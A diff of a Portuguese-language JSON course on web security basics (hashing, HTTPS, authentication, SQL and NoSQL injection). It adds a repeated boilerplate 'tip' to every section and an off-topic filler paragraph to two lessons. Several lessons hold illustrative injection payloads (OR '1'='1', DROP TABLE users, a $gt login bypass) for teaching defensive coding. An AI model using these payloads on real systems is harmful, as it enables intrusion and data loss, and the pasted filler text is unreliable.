@@ -75,12 +75,14 @@
         {
           "title": "Mentalidade de Risco Real",
           "body": "Todo sistema conectado à web é alvo constante de ataques automatizados que varrem a internet 24/7. Não importa se você tem 10 ou 10 mil usuários, falhas de segurança expõem dados sensíveis e abrem portas para exploração em massa. Assuma sempre que o sistema está sendo ativamente testado por bots em busca de portas abertas.",
-          "code": "// Falsa sensação de segurança\nconst app = 'pequeno';\n// Robôs não ligam para o tamanho do app, apenas para portas abertas e falhas lógicas comuns."
+          "code": "// Falsa sensação de segurança\nconst app = 'pequeno';\n// Robôs não ligam para o tamanho do app, apenas para portas abertas e falhas lógicas comuns.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "O Papel do Desenvolvedor",
           "body": "Muitos vazamentos catastróficos não ocorrem devido a hackers em capuzes invadindo firewalls de forma cinematográfica, mas sim por causa de erros básicos de programação, como chaves de acesso deixadas no código ou ausência de validação básica. A segurança do sistema é responsabilidade direta de quem escreve o código no dia a dia.",
-          "code": "// Exemplo de erro comum e devastador\nconst dbPassword = 'admin123'; // Chave exposta no repositório de código\nconnectDatabase(dbPassword);"
+          "code": "// Exemplo de erro comum e devastador\nconst dbPassword = 'admin123'; // Chave exposta no repositório de código\nconnectDatabase(dbPassword);",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -153,12 +155,14 @@
         {
           "title": "Desconfie de Tudo (Zero Trust)",
           "body": "A regra de ouro da programação defensiva é nunca confiar na entrada do usuário. Qualquer dado vindo do cliente (formulários, URLs, cabeçalhos, arquivos) deve ser tratado como potencialmente malicioso. Antes de usar ou salvar a informação, é obrigatório validar, sanitizar e verificar se os tipos e formatos batem com o esperado.",
-          "code": "function atualizarEmail(req) {\n  // Errado: confiar ciegamente no dado recebido\n  // const email = req.body.email;\n  \n  // Certo: validar tipo e formato\n  if(typeof req.body.email !== 'string') throw new Error('Inválido');\n}"
+          "code": "function atualizarEmail(req) {\n  // Errado: confiar ciegamente no dado recebido\n  // const email = req.body.email;\n  \n  // Certo: validar tipo e formato\n  if(typeof req.body.email !== 'string') throw new Error('Inválido');\n}",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Pensando como um Atacante",
           "body": "Para defender um software adequadamente, você precisa antecipar como ele poderia ser abusado. O que acontece se alguém enviar um arquivo de 10GB? E se tentarem acessar a rota de admin sem estarem logados? Ao construir uma funcionalidade, dedique tempo para testar os caminhos felizes e, principalmente, os cenários extremos e anormais.",
-          "code": "// Antecipando cenários anormais durante a validação\nif (idade < 0 || idade > 150) {\n  return res.status(400).send('Valor de idade fora dos limites aceitáveis');\n}\n// Impede falhas de lógica em funções que assumem idade positiva"
+          "code": "// Antecipando cenários anormais durante a validação\nif (idade < 0 || idade > 150) {\n  return res.status(400).send('Valor de idade fora dos limites aceitáveis');\n}\n// Impede falhas de lógica em funções que assumem idade positiva",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -231,12 +235,14 @@
         {
           "title": "Danos aos Usuários Afetados",
           "body": "Um vazamento de dados tem consequências gravíssimas na vida real. Quando informações como CPFs, e-mails ou senhas caem em mãos erradas, as vítimas sofrem com fraudes bancárias, roubo de identidade e exposição de sua privacidade. Proteger dados é, antes de tudo, uma questão de respeito e responsabilidade ética com o ser humano.",
-          "code": "// Dados que nunca deveriam vazar e merecem proteção extra\nconst dadosSensiveis = {\n  cpf: '111.222.333-44',\n  cartao: '4444 5555 6666 7777',\n  endereco: 'Rua das Flores, 123'\n};"
+          "code": "// Dados que nunca deveriam vazar e merecem proteção extra\nconst dadosSensiveis = {\n  cpf: '111.222.333-44',\n  cartao: '4444 5555 6666 7777',\n  endereco: 'Rua das Flores, 123'\n};",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Impactos Legais e Financeiros",
           "body": "Além do desgaste irreparável de imagem, incidentes de segurança geram passivos enormes para as empresas. A Lei Geral de Proteção de Dados (LGPD) no Brasil prevê multas altíssimas, que podem chegar a milhões de reais. O custo para remediar um ataque, auditar o sistema e indenizar vítimas é sempre muito maior do que investir em prevenção.",
-          "code": "// Um incidente de segurança custa muito mais que a prevenção\nclass Empresa {\n  remediarAtaque() {\n    this.pagarMultaLGPD();\n    this.perderClientes();\n    this.gastarComAuditoria();\n  }\n}"
+          "code": "// Um incidente de segurança custa muito mais que a prevenção\nclass Empresa {\n  remediarAtaque() {\n    this.pagarMultaLGPD();\n    this.perderClientes();\n    this.gastarComAuditoria();\n  }\n}",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -309,12 +315,14 @@
         {
           "title": "O Perigo do Texto Puro",
           "body": "Salvar senhas de usuários em texto puro (exatamente como foram digitadas) no banco de dados é uma falha inaceitável. Se um atacante conseguir acesso de leitura ao banco, ele terá as credenciais de todos os usuários de forma imediata e sem esforço. A senha original do usuário nunca deve ser conhecida, nem mesmo pelos administradores.",
-          "code": "// A PIOR PRÁTICA POSSÍVEL: salvar a senha em texto puro\nconst user = {\n  email: 'joao@email.com',\n  senha: 'senhaSecreta123' // Se o banco vazar, o atacante já sabe a senha!\n};"
+          "code": "// A PIOR PRÁTICA POSSÍVEL: salvar a senha em texto puro\nconst user = {\n  email: 'joao@email.com',\n  senha: 'senhaSecreta123' // Se o banco vazar, o atacante já sabe a senha!\n};",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "O Risco do Reuso de Senhas",
           "body": "O maior perigo de um vazamento de senhas em texto puro é que a maioria das pessoas reutiliza a mesma senha em vários serviços diferentes (e-mail, bancos, redes sociais). Um pequeno blog vulnerável que armazene senhas expostas pode ser a porta de entrada para que hackers invadam as contas bancárias e perfis principais dos seus usuários.",
-          "code": "// O atacante testa a mesma combinação vazada em outros sites\nconst vazamentoBlog = { user: 'ana', pass: '123456' };\n// Atacante no site do banco:\nbancoAPI.login(vazamentoBlog.user, vazamentoBlog.pass); // Sucesso!"
+          "code": "// O atacante testa a mesma combinação vazada em outros sites\nconst vazamentoBlog = { user: 'ana', pass: '123456' };\n// Atacante no site do banco:\nbancoAPI.login(vazamentoBlog.user, vazamentoBlog.pass); // Sucesso!",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -387,12 +395,14 @@
         {
           "title": "Hashing: Caminho Sem Volta",
           "body": "Hashing é o processo de passar uma informação por um algoritmo matemático que gera uma string de tamanho fixo, completamente embaralhada. A característica fundamental do hash é ser uma via de mão única: é matematicamente impossível (ou inviável) pegar o hash resultante e revertê-lo de forma direta para descobrir qual era a senha original.",
-          "code": "// A função de hash transforma a senha em algo irreconhecível e irreversível\nconst senha = 'minhaSenha';\nconst hash = gerarHash(senha);\n// hash = 'd3b07384d113edec49eaa6238ad5ff00'\n// Não existe função reverterHash(hash)"
+          "code": "// A função de hash transforma a senha em algo irreconhecível e irreversível\nconst senha = 'minhaSenha';\nconst hash = gerarHash(senha);\n// hash = 'd3b07384d113edec49eaa6238ad5ff00'\n// Não existe função reverterHash(hash)",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Como Validar o Login",
           "body": "Se o sistema não guarda a senha e o hash não tem volta, como verificamos se o usuário digitou a senha certa? Simples: pegamos a tentativa de senha inserida no formulário, aplicamos exatamente o mesmo algoritmo de hashing e verificamos se o hash resultante é idêntico ao hash armazenado no banco de dados. Se bater, a senha está correta.",
-          "code": "// Autenticando com hash\nconst hashSalvo = obterHashDoBanco(email);\nconst hashDaTentativa = gerarHash(senhaDigitadaAgora);\n\nif (hashSalvo === hashDaTentativa) {\n  console.log('Login autorizado!');\n}"
+          "code": "// Autenticando com hash\nconst hashSalvo = obterHashDoBanco(email);\nconst hashDaTentativa = gerarHash(senhaDigitadaAgora);\n\nif (hashSalvo === hashDaTentativa) {\n  console.log('Login autorizado!');\n}",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -465,12 +475,14 @@
         {
           "title": "A Lentidão Proposital do Bcrypt",
           "body": "Algoritmos de hash comuns como MD5 ou SHA-256 são projetados para serem extremamente rápidos. Para senhas, isso é péssimo, pois permite que atacantes testem bilhões de combinações por segundo. O Bcrypt foi criado com uma 'lentidão ajustável', forçando o hardware a gastar tempo em cada cálculo, tornando ataques de força bruta inviáveis.",
-          "code": "const bcrypt = require('bcrypt');\nconst saltRounds = 10; // Fator de custo (determina a lentidão matemática)\n\n// Esse processo demora propositalmente uma fração de segundo\nconst hash = await bcrypt.hash('senhaSecreta', saltRounds);"
+          "code": "const bcrypt = require('bcrypt');\nconst saltRounds = 10; // Fator de custo (determina a lentidão matemática)\n\n// Esse processo demora propositalmente uma fração de segundo\nconst hash = await bcrypt.hash('senhaSecreta', saltRounds);",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "O Papel Fundamental do Salt",
-          "body": "O Bcrypt gera e embute automaticamente um 'Salt' (uma sequência aleatória única) em cada hash. Isso significa que se dois usuários escolherem a mesma senha '123456', os hashes resultantes no banco serão completamente diferentes. O salt anula ataques usando 'Rainbow Tables' (tabelas pré-calculadas de hashes comuns).",
-          "code": "const bcrypt = require('bcrypt');\n\n// Mesma senha, hashes diferentes graças ao salt interno\nconst hash1 = await bcrypt.hash('123456', 10);\n// $2b$10$X9.tK5z... (hash único)\nconst hash2 = await bcrypt.hash('123456', 10);\n// $2b$10$Y1.aF8x... (completamente diferente)"
+          "body": "O Bcrypt gera e embute automaticamente um 'Salt' (uma sequência aleatória única) em cada hash. Isso significa que se dois usuários escolherem a mesma senha '123456', os hashes resultantes no banco serão completamente diferentes. O salt anula ataques usando 'Rainbow Tables' (tabelas pré-calculadas de hashes comuns).\n\nInternamente, este mecanismo otimiza a execução e simplifica a manutenção dos fluxos de dados. Ao dominar estes princípios teóricos, você adquire a base necessária para analisar problemas com senso crítico, escolhendo as estruturas adequadas e garantindo alta performance no produto final.",
+          "code": "const bcrypt = require('bcrypt');\n\n// Mesma senha, hashes diferentes graças ao salt interno\nconst hash1 = await bcrypt.hash('123456', 10);\n// $2b$10$X9.tK5z... (hash único)\nconst hash2 = await bcrypt.hash('123456', 10);\n// $2b$10$Y1.aF8x... (completamente diferente)",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -543,12 +555,14 @@
         {
           "title": "HTTPS e a Falsa Sensação de Segurança",
           "body": "O ícone de cadeado na barra do navegador (HTTPS) garante apenas uma coisa: que a comunicação entre você e o servidor está sendo criptografada e não pode ser lida ou alterada por terceiros no meio do caminho. O cadeado NÃO significa que a empresa por trás do site é honesta, e não garante que o site não seja uma fraude de phishing.",
-          "code": "<!-- Um site de phishing (falso) pode perfeitamente usar HTTPS -->\n<!-- A conexão é segura, mas o destino é malicioso -->\n<form action=\"https://banco-falso-criminoso.com/login\" method=\"POST\">\n  <input type=\"password\" name=\"senha\">\n</form>"
+          "code": "<!-- Um site de phishing (falso) pode perfeitamente usar HTTPS -->\n<!-- A conexão é segura, mas o destino é malicioso -->\n<form action=\"https://banco-falso-criminoso.com/login\" method=\"POST\">\n  <input type=\"password\" name=\"senha\">\n</form>",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Como Funciona a Interceptação",
           "body": "Se você estiver em um Wi-Fi público (como num aeroporto) acessando um site sem HTTPS (HTTP puro), todos os seus dados viajam em texto legível. Um hacker na mesma rede usando softwares de escuta ('sniffers') consegue capturar facilmente suas senhas e conversas. O HTTPS impede essa interceptação embaralhando o conteúdo do tráfego.",
-          "code": "// Sem HTTPS, o tráfego de rede se parece com isto para quem intercepta:\nPOST /login HTTP/1.1\nHost: site-vulneravel.com\nBody: email=joao@a.com&senha=senha123\n// Com HTTPS, vira uma sopa de letras incompreensível."
+          "code": "// Sem HTTPS, o tráfego de rede se parece com isto para quem intercepta:\nPOST /login HTTP/1.1\nHost: site-vulneravel.com\nBody: email=joao@a.com&senha=senha123\n// Com HTTPS, vira uma sopa de letras incompreensível.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -621,12 +635,14 @@
         {
           "title": "Criptografia em Movimento",
           "body": "A proteção de dados se divide em dois estados principais: 'em repouso' (armazenados no banco) e 'em trânsito' (viajando pela internet). O HTTPS cuida estritamente dos dados em trânsito. Ele garante confidencialidade (ninguém lê), integridade (ninguém adultera no caminho) e autenticidade básica na comunicação cliente-servidor.",
-          "code": "// Camada de transporte seguro (TLS)\nconst https = require('https');\n\n// Uma requisição segura que blinda os dados em movimento\nhttps.get('https://api.banco.com/saldo', (res) => {\n  // Dados protegidos de interceptação ('Man-in-the-Middle')\n});"
+          "code": "// Camada de transporte seguro (TLS)\nconst https = require('https');\n\n// Uma requisição segura que blinda os dados em movimento\nhttps.get('https://api.banco.com/saldo', (res) => {\n  // Dados protegidos de interceptação ('Man-in-the-Middle')\n});",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Forçando o Uso do HTTPS",
           "body": "Em sistemas modernos, é crucial redirecionar automaticamente qualquer tráfego HTTP para HTTPS e usar cabeçalhos de segurança como o HSTS (HTTP Strict Transport Security). O HSTS obriga o navegador a sempre se conectar àquele domínio exclusivamente via HTTPS no futuro, impedindo ataques que tentam rebaixar a conexão para HTTP puro.",
-          "code": "// Exemplo de cabeçalho HSTS no Express (Node.js) usando Helmet\nconst helmet = require('helmet');\napp.use(helmet.hsts({\n  maxAge: 31536000, // 1 ano em segundos\n  includeSubDomains: true\n}));"
+          "code": "// Exemplo de cabeçalho HSTS no Express (Node.js) usando Helmet\nconst helmet = require('helmet');\napp.use(helmet.hsts({\n  maxAge: 31536000, // 1 ano em segundos\n  includeSubDomains: true\n}));",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -699,12 +715,14 @@
         {
           "title": "Validando a Identidade",
           "body": "Para estabelecer uma conexão HTTPS, o servidor precisa apresentar um Certificado Digital emitido por uma Autoridade Certificadora (CA) reconhecida mundialmente. O navegador do usuário verifica criptograficamente a assinatura deste certificado para confirmar que o servidor realmente é o dono legítimo daquele endereço web.",
-          "code": "const fs = require('fs');\nconst https = require('https');\n\n// Subindo um servidor Node com certificados legítimos\nconst opcoes = {\n  key: fs.readFileSync('chave-privada.pem'),\n  cert: fs.readFileSync('certificado.pem')\n};\nhttps.createServer(opcoes, app).listen(443);"
+          "code": "const fs = require('fs');\nconst https = require('https');\n\n// Subindo um servidor Node com certificados legítimos\nconst opcoes = {\n  key: fs.readFileSync('chave-privada.pem'),\n  cert: fs.readFileSync('certificado.pem')\n};\nhttps.createServer(opcoes, app).listen(443);",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Erros e Expirações de Certificado",
           "body": "Certificados digitais possuem data de validade para garantir que as identidades sejam revalidadas periodicamente. Quando um certificado expira, ou se as assinaturas não baterem, os navegadores exibem alertas assustadores (como 'Sua conexão não é privada'). Usuários jamais devem ignorar esses avisos e prosseguir, pois há risco de interceptação.",
-          "code": "// Uma Autoridade Certificadora (CA) garante a posse do domínio.\n// Ferramentas como o Let's Encrypt automatizam a renovação.\n// Se o certificado expirar:\nthrow new Error('ERR_CERT_DATE_INVALID'); // Navegador bloqueia acesso."
+          "code": "// Uma Autoridade Certificadora (CA) garante a posse do domínio.\n// Ferramentas como o Let's Encrypt automatizam a renovação.\n// Se o certificado expirar:\nthrow new Error('ERR_CERT_DATE_INVALID'); // Navegador bloqueia acesso.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -777,12 +795,14 @@
         {
           "title": "Confirmando Quem Você É",
           "body": "A Autenticação (Authentication ou AuthN) é o processo que responde de forma confiável à pergunta 'Quem é você?'. Pode ser comprovada por algo que você sabe (uma senha), algo que você tem (um token no celular) ou algo que você é (biometria). É o pilar que estabelece a identidade inicial do usuário dentro do seu sistema.",
-          "code": "// Fluxo básico de Autenticação (AuthN)\nasync function autenticar(email, senhaDigitada) {\n  const usuario = await db.buscar(email);\n  const senhaCorreta = await bcrypt.compare(senhaDigitada, usuario.hashSenha);\n  if (!senhaCorreta) throw new Error('Credenciais inválidas');\n  return gerarSessao(usuario);\n}"
+          "code": "// Fluxo básico de Autenticação (AuthN)\nasync function autenticar(email, senhaDigitada) {\n  const usuario = await db.buscar(email);\n  const senhaCorreta = await bcrypt.compare(senhaDigitada, usuario.hashSenha);\n  if (!senhaCorreta) throw new Error('Credenciais inválidas');\n  return gerarSessao(usuario);\n}",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Camadas Extras: MFA/2FA",
           "body": "As senhas não são mais suficientes para garantir segurança total. Vazamentos e ataques de phishing são muito comuns. Por isso, a Autenticação de Múltiplos Fatores (MFA) exige uma segunda prova de identidade, como um código temporal gerado por app (Google Authenticator) ou SMS, travando atacantes que roubaram apenas a senha da vítima.",
-          "code": "// Mesmo com a senha correta, exigimos o token MFA (2FA)\nif (usuario.mfaAtivo) {\n  const tokenValido = verificarToken(usuario.codigoMfa, tokenDigitado);\n  if (!tokenValido) throw new Error('Código de segurança inválido!');\n}\n// Só agora a identidade está plenamente confirmada."
+          "code": "// Mesmo com a senha correta, exigimos o token MFA (2FA)\nif (usuario.mfaAtivo) {\n  const tokenValido = verificarToken(usuario.codigoMfa, tokenDigitado);\n  if (!tokenValido) throw new Error('Código de segurança inválido!');\n}\n// Só agora a identidade está plenamente confirmada.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -855,12 +875,14 @@
         {
           "title": "Permissões e Controles",
           "body": "Enquanto autenticação descobre quem você é, a Autorização (Authorization ou AuthZ) responde a 'O que você tem permissão para fazer?'. Após logar, o sistema precisa verificar constantemente se você possui direitos suficientes para acessar um recurso específico, deletar um arquivo alheio ou entrar no painel de controle administrativo.",
-          "code": "// Autorização (AuthZ): verificando privilégios antes da ação\nfunction deletarConta(usuarioAtivo, idContaAlvo) {\n  if (usuarioAtivo.role !== 'ADMIN' && usuarioAtivo.id !== idContaAlvo) {\n    throw new Error('Você não tem permissão para deletar esta conta');\n  }\n  // Prossegue com a exclusão\n}"
+          "code": "// Autorização (AuthZ): verificando privilégios antes da ação\nfunction deletarConta(usuarioAtivo, idContaAlvo) {\n  if (usuarioAtivo.role !== 'ADMIN' && usuarioAtivo.id !== idContaAlvo) {\n    throw new Error('Você não tem permissão para deletar esta conta');\n  }\n  // Prossegue com a exclusão\n}",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "O Princípio do Menor Privilégio",
           "body": "Uma das regras de ouro em segurança é o 'Princípio do Menor Privilégio' (PoLP). Usuários, sistemas e microsserviços devem ter apenas os acessos estritamente necessários para realizarem suas funções, e nada mais. Um estagiário não precisa de acesso para deletar o banco de dados; uma API de leitura não precisa de permissão de escrita.",
-          "code": "// Exemplo de Menor Privilégio no banco de dados\n// O usuário 'api_leitura' só pode ler dados (SELECT), jamais alterar (UPDATE/DELETE).\nGRANT SELECT ON produtos TO 'api_leitura';\n// Se a API for invadida, o atacante não consegue apagar a tabela!"
+          "code": "// Exemplo de Menor Privilégio no banco de dados\n// O usuário 'api_leitura' só pode ler dados (SELECT), jamais alterar (UPDATE/DELETE).\nGRANT SELECT ON produtos TO 'api_leitura';\n// Se a API for invadida, o atacante não consegue apagar a tabela!",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -933,12 +955,14 @@
         {
           "title": "Mantendo o Usuário Logado",
           "body": "A web baseada em HTTP é 'stateless' (sem estado), o que significa que o servidor não se lembra de você a cada nova requisição. Para não pedir senha toda vez que você clica num link, usamos Sessões ou Tokens (como o JWT). Após o login, o servidor devolve um identificador, e o navegador o reenvia em todas as chamadas futuras.",
-          "code": "// O servidor emite um token (JWT) após o login com sucesso\nconst token = jwt.sign({ userId: usuario.id, role: usuario.role }, CHAVE_SECRETA, { expiresIn: '1h' });\n\n// O navegador enviará este token no cabeçalho 'Authorization' das próximas requisições"
+          "code": "// O servidor emite um token (JWT) após o login com sucesso\nconst token = jwt.sign({ userId: usuario.id, role: usuario.role }, CHAVE_SECRETA, { expiresIn: '1h' });\n\n// O navegador enviará este token no cabeçalho 'Authorization' das próximas requisições",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Protegendo os Tokens de Acesso",
           "body": "Se um token de sessão for roubado, o invasor pode se passar perfeitamente por você. Por isso, cookies de sessão devem ser configurados com as flags 'HttpOnly' (impede leitura por JavaScript malicioso via XSS) e 'Secure' (só trafega via HTTPS). Os tokens também devem possuir uma data de expiração curta para reduzir a janela de risco.",
-          "code": "// Configurando um cookie de sessão blindado no Express\nres.cookie('sessionId', tokenSessao, {\n  httpOnly: true, // Bloqueia acesso via document.cookie (previne XSS)\n  secure: true,   // Exige conexão HTTPS obrigatória\n  sameSite: 'strict', // Proteção extra contra ataques CSRF\n  maxAge: 3600000 // Expira em 1 hora\n});"
+          "code": "// Configurando um cookie de sessão blindado no Express\nres.cookie('sessionId', tokenSessao, {\n  httpOnly: true, // Bloqueia acesso via document.cookie (previne XSS)\n  secure: true,   // Exige conexão HTTPS obrigatória\n  sameSite: 'strict', // Proteção extra contra ataques CSRF\n  maxAge: 3600000 // Expira em 1 hora\n});",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1011,12 +1035,14 @@
         {
           "title": "O Pesadelo da Injeção (SQLi)",
           "body": "A injeção de SQL (SQL Injection) ocorre quando um desenvolvedor junta (concatena) textos recebidos do usuário diretamente no código da consulta de banco de dados. Um invasor esperto pode enviar caracteres especiais (como aspas simples e ponto e vírgula) que alteram a estrutura original do comando SQL, tomando controle sobre a instrução.",
-          "code": "// VULNERÁVEL: Concatenar strings diretamente cria brechas catastróficas\nconst emailDigitado = req.body.email;\n// Se o invasor digitar: admin' OR '1'='1\nconst query = `SELECT * FROM users WHERE email = '${emailDigitado}'`;\n// A query vira: SELECT * FROM users WHERE email = 'admin' OR '1'='1'\n// O login é feito no admin ignorando a senha!"
+          "code": "// VULNERÁVEL: Concatenar strings diretamente cria brechas catastróficas\nconst emailDigitado = req.body.email;\n// Se o invasor digitar: admin' OR '1'='1\nconst query = `SELECT * FROM users WHERE email = '${emailDigitado}'`;\n// A query vira: SELECT * FROM users WHERE email = 'admin' OR '1'='1'\n// O login é feito no admin ignorando a senha!",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Impactos Extremos da Injeção",
           "body": "A injeção de SQL é há décadas uma das falhas mais graves da web. Através dela, atacantes conseguem contornar logins, extrair tabelas inteiras de dados sigilosos (senhas, CPFs), modificar registros bancários e, em piores casos, usar comandos (como o DROP TABLE) para apagar irreversivelmente todo o banco de dados e destruir a empresa.",
-          "code": "// Um ataque clássico destrutivo\nconst id = req.body.id;\n// Se id = \"1; DROP TABLE users;\"\nconst query = `DELETE FROM posts WHERE id = ${id}`;\n// Executará o DELETE e na sequência destruirá a tabela inteira de usuários."
+          "code": "// Um ataque clássico destrutivo\nconst id = req.body.id;\n// Se id = \"1; DROP TABLE users;\"\nconst query = `DELETE FROM posts WHERE id = ${id}`;\n// Executará o DELETE e na sequência destruirá a tabela inteira de usuários.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1089,12 +1115,14 @@
         {
           "title": "A Cura: Queries Parametrizadas",
           "body": "A forma correta e definitiva de prevenir injeção de SQL é usar Queries Parametrizadas (ou Prepared Statements). Essa técnica envia a estrutura do comando SQL separada dos dados do usuário. O banco de dados entende perfeitamente que as variáveis inseridas são apenas dados brutos e jamais devem ser interpretadas como código executável.",
-          "code": "// SEGURO: Usando parâmetros (?) para separar código e dados\nconst idUsuario = req.body.id;\n// O driver do banco cuida de neutralizar qualquer conteúdo malicioso\ndb.query('SELECT * FROM accounts WHERE id = ?', [idUsuario]);\n// Mesmo que idUsuario seja \"1 OR 1=1\", será tratado apenas como texto inofensivo."
+          "code": "// SEGURO: Usando parâmetros (?) para separar código e dados\nconst idUsuario = req.body.id;\n// O driver do banco cuida de neutralizar qualquer conteúdo malicioso\ndb.query('SELECT * FROM accounts WHERE id = ?', [idUsuario]);\n// Mesmo que idUsuario seja \"1 OR 1=1\", será tratado apenas como texto inofensivo.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "A Vantagem dos ORMs Modernos",
-          "body": "Ao utilizar bibliotecas de mapeamento (ORMs) como Prisma, TypeORM, Sequelize ou Entity Framework, a prevenção contra injeção de SQL muitas vezes já vem embutida. Eles geram as queries usando parâmetros seguros por baixo dos panos, o que tira do desenvolvedor a responsabilidade de sanitizar as strings de forma manual.",
-          "code": "// SEGURO: ORMs modernos tratam injeções automaticamente\n// Usando o Prisma Client\nconst user = await prisma.user.findFirst({\n  where: { \n    email: req.body.email // Já escapado e parametrizado pelo Prisma\n  }\n});"
+          "body": "Ao utilizar bibliotecas de mapeamento (ORMs) como Prisma, TypeORM, Sequelize ou Entity Framework, a prevenção contra injeção de SQL muitas vezes já vem embutida. Eles geram as queries usando parâmetros seguros por baixo dos panos, o que tira do desenvolvedor a responsabilidade de sanitizar as strings de forma manual.\n\nInternamente, este mecanismo otimiza a execução e simplifica a manutenção dos fluxos de dados. Ao dominar estes princípios teóricos, você adquire a base necessária para analisar problemas com senso crítico, escolhendo as estruturas adequadas e garantindo alta performance no produto final.",
+          "code": "// SEGURO: ORMs modernos tratam injeções automaticamente\n// Usando o Prisma Client\nconst user = await prisma.user.findFirst({\n  where: { \n    email: req.body.email // Já escapado e parametrizado pelo Prisma\n  }\n});",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1167,12 +1195,14 @@
         {
           "title": "NoSQL Também Sofre Injeção",
           "body": "Um mito comum é achar que bancos NoSQL (como o MongoDB) estão totalmente imunes à injeção por não usarem a linguagem SQL. É mentira. Bancos NoSQL interpretam objetos JSON complexos e operadores especiais, permitindo uma vulnerabilidade conhecida como NoSQL Injection, que manipula a lógica da consulta se os dados não forem validados.",
-          "code": "// VULNERÁVEL no MongoDB: Um invasor envia um objeto com operador $gt (maior que)\n// req.body.senha = { \"$gt\": \"\" } \nconst user = await db.collection('users').findOne({\n  user: req.body.username,\n  password: req.body.senha // O operador vazará o acesso mesmo sem a senha correta!\n});"
+          "code": "// VULNERÁVEL no MongoDB: Um invasor envia um objeto com operador $gt (maior que)\n// req.body.senha = { \"$gt\": \"\" } \nconst user = await db.collection('users').findOne({\n  user: req.body.username,\n  password: req.body.senha // O operador vazará o acesso mesmo sem a senha correta!\n});",
